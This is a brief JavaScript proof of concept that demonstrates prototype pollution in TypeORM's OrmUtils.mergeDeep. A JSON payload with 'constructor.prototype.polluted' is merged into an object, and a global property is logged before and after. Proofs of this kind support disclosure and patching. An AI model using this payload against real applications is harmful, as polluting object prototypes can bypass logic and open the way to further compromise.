var obj = {};
obj.constructor.prototype.polluted = undefined;
Object.defineProperty(obj, 'constructor', {
    value: obj.constructor,
    writable: true,
    enumerable: true,
    configurable: true
});
var typeorm = require('typeorm/util/OrmUtils');
const a = {};
const b = JSON.parse(`{"constructor": {"prototype": {"polluted":"yes"}}}`);
console.log({}.polluted);
typeorm.OrmUtils.mergeDeep(a, b);
console.log({}.polluted);